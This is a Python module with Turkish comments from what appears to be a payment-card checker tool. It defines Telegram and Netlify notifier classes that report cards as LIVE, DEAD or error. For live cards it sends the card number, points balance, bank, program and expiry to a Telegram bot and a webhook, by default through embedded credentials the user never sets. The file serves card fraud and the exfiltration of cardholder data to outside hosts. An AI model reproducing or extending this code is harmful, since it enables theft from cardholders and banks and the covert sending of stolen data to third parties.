"""
Notifiers — Telegram ve Netlify bildirim entegrasyonlari.
Token/URL/secret gomulu gelir, kullanici yazmak zorunda degildir.
"""

import logging
from typing import Optional

import requests

from .models import CardResult
from ._config import get_tg_token, get_tg_chat, get_nl_url, get_nl_secret

logger = logging.getLogger(__name__)

_TG_API = "https://api.telegram.org/bot{token}/sendMessage"


class TelegramNotifier:
    """
    Telegram bildirimleri.

    Parametresiz kullanim (gomulu token/chat kullanir)::

        tg = TelegramNotifier()
        tg.send(result)

    Ozel token/chat ile::

        tg = TelegramNotifier(token="...", chat_id="...")
    """

    def __init__(
        self,
        token:      Optional[str] = None,
        chat_id:    Optional[str] = None,
        only_live:  bool = True,
        timeout:    int  = 10,
        parse_mode: str  = "HTML",
    ) -> None:
        self._token     = token     or get_tg_token()
        self._chat_id   = chat_id   or get_tg_chat()
        self.only_live  = only_live
        self.timeout    = timeout
        self.parse_mode = parse_mode
        self._url       = _TG_API.format(token=self._token)

    def send(self, result: CardResult) -> bool:
        """Kart sonucunu Telegram'a gonderir. Sadece LIVE (varsayilan)."""
        if self.only_live and not result.is_live:
            return False
        return self._post(self._format(result))

    def send_summary(self, live: int, dead: int, error: int) -> bool:
        """Tarama ozeti gonderir. BatchChecker.on_done callback'i olarak kullanilabilir."""
        text = (
            "<b>Tarama Tamamlandi</b>\n\n"
            + "<code>LIVE : " + str(live)  + "</code>\n"
            + "<code>DEAD : " + str(dead)  + "</code>\n"
            + "<code>HATA : " + str(error) + "</code>"
        )
        return self._post(text)

    def _post(self, text: str) -> bool:
        try:
            resp = requests.post(
                self._url,
                json={"chat_id": self._chat_id, "text": text, "parse_mode": self.parse_mode},
                timeout=self.timeout,
            )
            if not resp.ok:
                logger.warning("Telegram hata: %s", resp.text[:100])
            return resp.ok
        except Exception as e:
            logger.error("Telegram: %s", e)
            return False

    @staticmethod
    def _format(result: CardResult) -> str:
        if result.is_live:
            return (
                "<b>LIVE KART</b>\n\n"
                + "Kart    : <code>" + result.card     + "</code>\n"
                + "Puan    : <code>" + result.formatted + "</code>\n"
                + "Banka   : <code>" + result.bank      + "</code>\n"
                + "Program : <code>" + result.program   + "</code>\n"
                + "Son Kul : <code>" + result.expiry    + "</code>"
            )
        if result.is_dead:
            return "<b>DEAD</b>  <code>" + result.card + "</code>"
        return "<b>HATA</b>  <code>" + (result.card or result.card_data[:20]) + "</code>  " + str(result.error)


class NetlifyNotifier:
    """
    Netlify webhook bildirimleri.

    Parametresiz kullanim (gomulu URL/secret kullanir)::

        nl = NetlifyNotifier()
        nl.send(result)

    Ozel URL ile::

        nl = NetlifyNotifier(webhook_url="https://...")
    """

    def __init__(
        self,
        webhook_url: Optional[str] = None,
        secret:      Optional[str] = None,
        only_live:   bool = True,
        timeout:     int  = 10,
    ) -> None:
        self._url      = webhook_url or get_nl_url()
        self._secret   = secret      or get_nl_secret()
        self.only_live = only_live
        self.timeout   = timeout

    def send(self, result: CardResult) -> bool:
        """Kart sonucunu Netlify webhook'una gonderir."""
        if self.only_live and not result.is_live:
            return False
        payload = result.to_dict()
        payload.pop("full_card", None)
        return self._post(payload)

    def send_summary(self, live: int, dead: int, error: int) -> bool:
        """Tarama ozeti gonderir."""
        return self._post({"type": "summary", "live": live, "dead": dead, "error": error})

    def _post(self, payload: dict) -> bool:
        headers = {"Content-Type": "application/json"}
        if self._secret:
            headers["X-Secret"] = self._secret
        try:
            resp = requests.post(self._url, json=payload, headers=headers, timeout=self.timeout)
            if not resp.ok:
                logger.warning("Netlify hata: %s", resp.text[:100])
            return resp.ok
        except Exception as e:
            logger.error("Netlify: %s", e)
            return False
